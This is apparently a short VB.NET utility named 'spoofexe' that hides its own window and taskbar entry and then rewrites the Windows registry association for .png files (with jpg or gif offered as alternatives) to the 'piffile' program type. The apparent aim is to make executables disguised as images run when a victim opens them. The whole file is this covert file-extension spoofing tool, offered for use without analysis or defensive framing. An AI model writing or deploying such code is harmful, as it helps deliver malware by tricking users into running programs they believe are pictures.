# spoofexe
Imports Microsoft.Win32
'write by flagellantX
Public Class Form1
    Public Hallajkeys As String
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.ShowIcon = 0
        Me.ShowInTaskbar = 0
        Dim Gozaro As RegistryKey = Registry.ClassesRoot.CreateSubKey(".png") 'you can change to jpg and Gif
        Gozaro.SetValue(Hallajkeys, "piffile")
        End
    End Sub
End Class
